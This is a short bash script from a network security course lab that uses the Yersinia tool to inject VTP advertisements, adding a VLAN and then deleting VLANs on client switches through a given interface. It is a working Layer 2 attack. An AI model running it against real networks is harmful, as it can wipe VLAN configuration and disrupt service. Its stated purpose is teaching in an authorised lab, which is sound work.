#!/bin/bash
# =============================================================
#  VTP ATTACK SCRIPT - Laboratorio Controlado
#  Materia: Seguridad de Redes - ITLA
#  Técnica: VTP Advertisement con revisión alta para
#           agregar/borrar VLANs en switches VTP Client
#  Herramienta: Yersinia
#  Propósito: Demostración académica. Solo entorno autorizado.
# =============================================================

IFACE="${1:-ens3}"

echo "[*] Iniciando VTP Attack en interfaz $IFACE"
echo "[*] Fase 1: Inyectar anuncio VTP para agregar VLAN..."
yersinia vtp -attack 1 -interface "$IFACE"

echo "[*] Fase 2: Inyectar anuncio VTP para borrar VLAN..."
yersinia vtp -attack 2 -interface "$IFACE"

echo "[+] VTP Attack completado."
